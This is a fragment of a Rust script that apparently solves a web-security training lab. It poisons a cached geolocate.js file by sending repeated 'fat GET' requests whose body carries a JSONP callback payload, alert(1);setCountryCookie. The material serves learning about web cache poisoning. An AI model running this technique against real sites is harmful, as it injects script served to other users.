...
const LAB_URL: &str = "https://0a610076033d41ad894d78a9009a0049.web-security-academy.net";

fn main() {
    let payload = r###"alert(1);setCountryCookie"###;
    ...
    for i in 1..=35 {
        print!("\r❯❯ Poisoning the geolocate.js file via a fat GET request ({i}/35).. ");
        flush_terminal();
...
fn poison_geolocate_js_file(payload: &str) -> Response {
    ...
    client
        .get(format!(
            "{LAB_URL}/js/geolocate.js?callback=setCountryCookie"
        ))
        .form(&HashMap::from([("callback", payload)]))
        .send()
        .expect(&format!(
            "{}",
